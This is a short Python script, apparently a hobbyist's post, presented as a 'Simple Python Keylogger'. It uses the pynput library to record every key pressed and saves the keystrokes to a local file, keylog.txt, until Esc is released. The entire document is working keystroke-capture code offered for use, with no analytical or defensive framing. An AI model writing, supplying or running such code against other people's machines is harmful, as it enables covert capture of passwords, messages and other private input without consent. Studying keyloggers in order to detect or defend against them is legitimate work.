"""
Name : Simple Python Keylogger
Authon : Devesh Singh
Description : This is a simple Keylogger script written in python which saves log in a file named keylog.txt .
Keylogger is a software or say program which captures the key strokes which we press on keyboard and saves it on a file.
"""

from pynput.keyboard import Key  
from pynput.keyboard import Listener  

the_keys = []   

def functionPerKey(key):  
    the_keys.append(key)  
    storeKeysToFile(the_keys)  
 
def storeKeysToFile(keys):  
    with open('keylog.txt', 'w') as log:  
        for key in keys:  
            key = str(key).replace("'", "")  
            log.write(key)  
def onEachKeyRelease(key):   
    if key == Key.esc:  
        return False  
  
with Listener(  
    on_press = functionPerKey,  
    on_release = onEachKeyRelease  
) as the_listener:  
    the_listener.join()  
